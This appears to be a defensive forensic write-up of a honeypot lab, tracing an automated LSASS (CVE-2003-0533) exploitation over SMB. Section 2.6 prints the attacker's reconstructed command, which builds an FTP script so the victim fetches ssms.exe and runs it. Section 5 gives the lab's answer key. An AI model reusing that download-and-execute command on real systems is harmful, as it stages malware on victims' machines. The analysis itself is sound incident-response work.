# Incident Report: HoneyBOT – MS04-011 (CVE-2003-0533) LSASS SMB Exploitation & Automated FTP Malware Staging

| Metadata | Details | 
| ----- | ----- | 
| **Date** | November 2026 | 
| **Analyst** | Piotr Asyngier | 
| **Tools Used** | Wireshark (`HoneyBOT.pcap`), Linux CLI (`sha256sum`), IP Geolocation, VirusTotal | 
| **Category** | Network Forensics, SMB/DCERPC Exploitation & Malware Analysis | 
| **Affected Environment** | Honeypot / Target Host: `192.150.11.111` | 

## 1. Executive Summary

Network sensors captured a suspicious automated exploitation sequence (`HoneyBOT.pcap`, comprising `348` packets) directed at internal honeypot/server **`192.150.11.111`**. A packet-level forensic investigation was conducted in **Wireshark**, supplemented by cryptographic hashing and **VirusTotal** threat intelligence lookups, to reconstruct the attack chain, identify the exploited vulnerability, and analyze the second-stage binary payload.

The investigation confirmed a rapid, fully automated worm/botnet compromise originating from external IPv4 address **`98.114.205.102`** (geolocated to the **United States (`US`)**):

1. **SMB / LSASS Exploitation (`CVE-2003-0533`):** Across **`5`** distinct TCP sessions lasting approximately **`16` seconds** in total, the attacker connected to `192.150.11.111` over **SMB** (`TCP/445`), bound to the `DSSETUP` interface over the `\lsarpc` named pipe, and triggered a stack-based buffer overflow via the `DsRoleUpgradeDownlevelServer` RPC operation (**`CVE-2003-0533` / `MS04-011`**).

2. **Shellcode Execution & FTP Staging (`TCP/8884`):** Following exploitation, the attacker connected to a bind shell on TCP port `1957` (`tcp.stream eq 2`) and executed a one-line command script instructing the victim's built-in **`ftp`** client to connect back to the attacker's FTP server on port **`8884`** (`open 0.0.0.0 8884`) and download **`ssms.exe`**.

3. **Payload Analysis (`ssms.exe`):** Reconstructing the raw FTP data transfer (`tcp.stream eq 4`, port `1080`) yielded a `158,720`-byte Win32 executable (`SHA-256: b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cddf6b6d`), which was first submitted to VirusTotal on **`2007-06-27`**.

## 2. Network Traffic Investigation & Technical Analysis

### 2.1. Attacker & Target IP Identification (`98.114.205.102` -> `192.150.11.111`)

Inspecting the initial TCP `SYN` handshakes and SMB session setup frames (`Frames 1–24`) in `HoneyBOT.pcap` established the source and destination hosts involved in the incident.

* **Findings:**

  * **Attacker IP Address (Source):** **`98.114.205.102`** (`MAC: 00:08:e2:3b:56:01`, `Cisco_3b:56:01`) initiating outbound connections to port `445`.

  * **Target IP Address (Destination):** **`192.150.11.111`** (`MAC: 00:30:48:62:4e:4a`, `SuperMicroCo_62:4e:4a`) receiving inbound SMB connections on port `445`.

<img width="1852" height="1048" alt="obraz" src="https://github.com/user-attachments/assets/30d7a66a-cd1a-4147-8e88-9bc6a2a9eecb" />

<img width="1852" height="1048" alt="obraz" src="https://github.com/user-attachments/assets/82e72439-31ae-440a-8981-c7310410deef" />


### 2.2. Attacker IP Geolocation (`US`)

Querying the attacker's public IPv4 address (`98.114.205.102`) in an IP Geolocation database revealed its geographic origin and ISP assignment.

* **Geolocation Details:**

  * **Country:** United States of America (**`US`**)

  * **Region / City:** Pennsylvania, Philadelphia (`ZIP: 19176`)

  * **ISP:** Verizon Business (`verizonenterprise.com`)

<img width="1852" height="963" alt="obraz" src="https://github.com/user-attachments/assets/7c0f1f4b-1b2b-4589-9502-0b1194b53cc2" />


### 2.3. TCP Session Enumeration (`5` Sessions)

To determine the total number of TCP conversations recorded during the capture, Wireshark's **Conversations** window (`Statistics -> Conversations -> TCP`) was analyzed.

* **Findings:**

  * Exactly **`5`** TCP sessions (`tcp.stream eq 0` through `tcp.stream eq 4`) were captured:

    | Stream ID | Address A : Port A | Address B : Port B | Packets | Bytes | Purpose |
    | :--- | :--- | :--- | :--- | :--- | :--- |
    | `0` | `98.114.205.102:1821` | `192.150.11.111:445` | `7` | `412 B` | Initial SMB port probe (`SYN` -> `FIN, ACK`) |
    | `1` | `98.114.205.102:1828` | `192.150.11.111:445` | `31` | `7 kB` | SMB `\ipc$` / `\lsarpc` session & `DSSETUP` exploit |
    | `2` | `98.114.205.102:1924` | `192.150.11.111:1957` | `12` | `817 B` | Bind shell command execution (`ftp -n -s:o`) |
    | `3` | `192.150.11.111:36296` | `98.114.205.102:8884` | `27` | `2 kB` | Outbound FTP control channel from victim to attacker |
    | `4` | `98.114.205.102:2152` | `192.150.11.111:1080` | `271` | `173 kB` | Inbound FTP data transfer (`ssms.exe`, `158,720 B`) |

<img width="1852" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/d4274ec8-d10d-49c3-ba2a-796de2fd958d" />


### 2.4. Attack Duration Calculation (`16` Seconds)

Comparing the arrival timestamp of the very first packet (`Frame 1`) against the final packet (`Frame 348`) in `HoneyBOT.pcap` determined the total duration of the attack.

* **Timestamp Comparison:**

  * **First Packet (`Frame 1`):** `2009-04-20 05:28:28.374595 UTC`

  * **Last Packet (`Frame 348`):** `2009-04-20 05:28:44.593813 UTC`

  * **Total Elapsed Time:** $44.593813 - 28.374595 = 16.219218\text{ s} \approx$ **`16`** seconds.

<img width="1852" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/ef116649-30af-4f7b-97c4-4b3e406f3d6f" />

<img width="1852" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/3e4c6155-3bf9-4763-b085-d3feeda2907c" />


### 2.5. Vulnerability Identification (`CVE-2003-0533`) & Carrier Protocol (`SMB`)

Inspecting `tcp.stream eq 1` (`Frames 10–38`) revealed how the attacker exploited the target system:

1. **SMB Session & Pipe Binding:** The attacker negotiated an **SMB** session on port `445` (`Frame 10`), authenticated with a null session (`User: \`), connected to `\\192.150.11.111\ipc$` (`Frame 20`), and opened the `\lsarpc` named pipe (`FID: 0x4000`, `Frame 23`).

2. **DCE/RPC `DSSETUP` Exploit:** In `Frame 26`, the attacker bound to the `DSSETUP` (`Active Directory Setup`) RPC interface (`UUID: 3919286a-b10c-11d0-9ba8-00c04fd92ef5`). In `Frame 33` (`05:28:30.180587 UTC`), the attacker sent an oversized `DsRoleUpgradeDownlevelServer request [Long frame (3208 bytes)]` (`Operation: DsRoleUpgradeDownlevelServer (9)`).

* **Findings:**

  * **Exploited CVE:** **`CVE-2003-0533`** (`MS04-011` – Microsoft Windows LSASS `DsRolerUpgradeDownlevelServer` Stack Buffer Overflow).

  * **Carrier Protocol:** **`SMB`** (Server Message Block).

<img width="1852" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/1b68502d-21bb-4ec2-8693-06879b66f43a" />

<img width="1852" height="963" alt="obraz" src="https://github.com/user-attachments/assets/804248db-41ae-4f4e-8c88-3e69ad8d5107" />

<img width="1852" height="1049" alt="obraz" src="https://github.com/user-attachments/assets/5d91d614-0082-455f-97c9-a86754c4755f" />


### 2.6. Post-Exploitation Staging Protocol (`ftp`), Malware Name (`ssms.exe`) & Port (`8884`)

Following the `DSSETUP` buffer overflow, the shellcode opened a listener on TCP port `1957` on the victim host. In `tcp.stream eq 2` (`98.114.205.102:1924 -> 192.150.11.111:1957`), the attacker sent a batch command sequence to download and execute the second-stage malware.

* **Reconstructed Command Stream (`tcp.stream eq 2`):**

  ```cmd
  echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
  ssms.exe
  ```

* **Findings:**

  * **Download Protocol:** **`ftp`** (writes an FTP script file `o`, runs `ftp -n -s:o`, deletes the script `del /F /Q o`, and executes `ssms.exe`).

  * **Downloaded Malware Filename:** **`ssms.exe`**

  * **Attacker Server Listening Port:** **`8884`** (confirmed in `tcp.stream eq 3`, where `192.150.11.111:36296` connects to `98.114.205.102:8884` with `USER 1`, `PASS 1`, `PORT 192,150,11,111,4,56`, and `RETR ssms.exe`).

<img width="1852" height="1049" alt="obraz" src="https://github.com/user-attachments/assets/26635185-fc7d-436f-9031-d8b7be0f3fa1" />

<img width="1852" height="1049" alt="obraz" src="https://github.com/user-attachments/assets/7ff53766-b7e3-4825-a704-5ac664c67c87" />

<img width="1852" height="1049" alt="obraz" src="https://github.com/user-attachments/assets/94b6ac17-4b44-4671-b3c6-f6d7ff770f69" />


### 2.7. Malware Extraction, Hashing & VirusTotal First Submission (`2007-06-27`)

In response to the `RETR ssms.exe` command on the FTP control channel, the attacker's host (`98.114.205.102:2152`) connected to the victim's active FTP data port (`192.150.11.111:1080`, calculated from `PORT` parameters $4 \times 256 + 56 = 1080$) in **`tcp.stream eq 4`** and transferred the raw `158,720`-byte executable.

* **Extraction & Hashing Procedure:**

  * Followed `tcp.stream eq 4` in Wireshark (`158 kB`), switched display format to **Raw** (`Dane surowe`), and saved the binary stream to disk (`calculate256sha.txt` / `ssms.exe`).

  * Calculated the SHA-256 hash via terminal:

    ```bash
    sha256sum calculate256sha.txt
    ```

  * **SHA-256:** `b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cddf6b6d` (`MD5: 14a09a48ad23fe0ea5a180bee8cb750a`).

* **VirusTotal History Analysis:**

  * Querying `b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cddf6b6d` on **VirusTotal** (**Details -> History**) revealed:

    * **First Submission:** `2007-06-27 08:47:05 UTC` (**`2007-06-27`**).

<img width="1852" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/d97e2588-302c-42bd-b638-0fa504b2130e" />

<img width="1852" height="1003" alt="obraz" src="https://github.com/user-attachments/assets/7260eee7-f041-450e-b2b6-05d6292a4a05" />

<img width="1852" height="1003" alt="obraz" src="https://github.com/user-attachments/assets/894212ee-1d6b-44fb-9895-07979387c0a8" />


## 3. Attack Timeline (April 20, 2009)

| Timestamp (UTC) | Source IP | Destination IP | Protocol / Stream | Activity Description | 
| ----- | ----- | ----- | ----- | ----- | 
| `2009-04-20 05:28:28.37` | `98.114.205.102:1821` | `192.150.11.111:445` | `TCP` (`Stream 0`) | Initial TCP `SYN` check against SMB port `445`. | 
| `2009-04-20 05:28:28.50` | `98.114.205.102:1828` | `192.150.11.111:445` | `SMB` (`Stream 1`) | SMB Null Session established; connects to `\\192.150.11.111\ipc$` and opens `\lsarpc`. | 
| `2009-04-20 05:28:30.18` | `98.114.205.102:1828` | `192.150.11.111:445` | `DSSETUP` (`#33`) | Exploits `CVE-2003-0533` via 3,208-byte `DsRoleUpgradeDownlevelServer` request. | 
| `2009-04-20 05:28:30.46` | `98.114.205.102:1924` | `192.150.11.111:1957` | `TCP` (`Stream 2`) | Connects to bind shell (`1957`) and runs `ftp -n -s:o` script to fetch `ssms.exe`. | 
| `2009-04-20 05:28:33.45` | `192.150.11.111:36296` | `98.114.205.102:8884` | `FTP` (`Stream 3`) | Victim authenticates (`user 1 1`) to attacker's FTP server on port `8884`. | 
| `2009-04-20 05:28:34.51` | `98.114.205.102:2152` | `192.150.11.111:1080` | `FTP-DATA` (`Stream 4`) | `ssms.exe` (`158,720 B`) transferred to victim; attack concludes at `05:28:44.59 UTC` (`16s` total). | 

## 4. Consolidated Indicators of Compromise (IoCs)

| Indicator Type | Value (Defanged) | Context | 
| ----- | ----- | ----- | 
| **Attacker IPv4** | `98.114.205[.]102` | External attacker / FTP staging server (`Verizon Business`, `US`) | 
| **Target IPv4** | `192.150.11[.]111` | Victim / Honeypot host | 
| **Exploited Vulnerability** | `CVE-2003-0533` (`MS04-011`) | LSASS `DsRoleUpgradeDownlevelServer` buffer overflow over SMB `\lsarpc` | 
| **Network Ports** | `TCP/445` (SMB), `TCP/1957` (Bind Shell), `TCP/8884` (FTP Control), `TCP/1080` (FTP Data) | Ports utilized across the 5 TCP streams | 
| **Malware Filename** | `ssms.exe` (`158,720 bytes`) | Worm / botnet payload downloaded via `ftp -n -s:o` | 
| **Malware SHA-256** | `b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cddf6b6d` | SHA-256 hash of `ssms.exe` (First VT submission: `2007-06-27`) | 
| **Malware MD5** | `14a09a48ad23fe0ea5a180bee8cb750a` | MD5 hash of `ssms.exe` | 

## 5. Summary of Lab Questions & Answers

| Question | Answer | 
| ----- | ----- | 
| **Q1:** What is the attacker's IP address? | `98.114.205.102` | 
| **Q2:** What is the target's IP address? | `192.150.11.111` | 
| **Q3:** Provide the country code for the attacker's IP address (a.k.a geo-location). | `US` | 
| **Q4:** How many TCP sessions are present in the captured traffic? | `5` | 
| **Q5:** How long did it take to perform the attack (in seconds)? | `16` | 
| **Q6:** Provide the CVE number of the exploited vulnerability. | `CVE-2003-0533` | 
| **Q7:** Which protocol was used to carry over the exploit? | `SMB` | 
| **Q8:** Which protocol did the attacker use to download additional malicious files to the target system? | `ftp` | 
| **Q9:** What is the name of the downloaded malware? | `ssms.exe` | 
| **Q10:** The attacker's server was listening on a specific port. Provide the port number. | `8884` | 
| **Q11:** When was the involved malware first submitted to VirusTotal for analysis? | `2007-06-27` | 

## 6. MITRE ATT&CK Mapping & Remediation

### MITRE ATT&CK Techniques

* **`T1210` – Exploitation of Remote Services:** Exploiting `CVE-2003-0533` (`MS04-011`) over SMB (`TCP/445`) via `\lsarpc` (`DsRoleUpgradeDownlevelServer`).

* **`T1059.003` – Command and Scripting Interpreter: Windows Command Shell:** Executing chained `echo` commands over a bind shell (`TCP/1957`) to build an unattended FTP download script (`o`).

* **`T1105` – Ingress Tool Transfer:** Using the native Windows `ftp.exe` utility (`ftp -n -s:o`) to download `ssms.exe` from `98.114.205.102:8884`.

* **`T1070.004` – Indicator Removal: File Deletion:** Executing `del /F /Q o` immediately after the FTP transfer to remove the temporary script artifact.

### Recommended Remediation Actions

1. **Patch Management & SMB Hardening:** Ensure legacy systems have Microsoft Security Bulletin **MS04-011** applied (or decommission unsupported legacy Windows versions), disable SMBv1, and restrict anonymous access to `IPC$` named pipes (`RestrictAnonymous`).

2. **Perimeter Firewall Filtering:** Block inbound and outbound SMB (`TCP/445`, `TCP/139`) at the network perimeter, and restrict outbound non-standard FTP connections (`TCP/8884`).

3. **Endpoint Detection:** Monitor for non-interactive command-line invocations of `ftp.exe -n -s:` spawned by system services (`lsass.exe` / `cmd.exe`) and quarantine any binaries matching SHA-256 `b14ccb3786af7553f7c251623499a7fe67974dde69d3dffd65733871cddf6b6d` (`ssms.exe`).
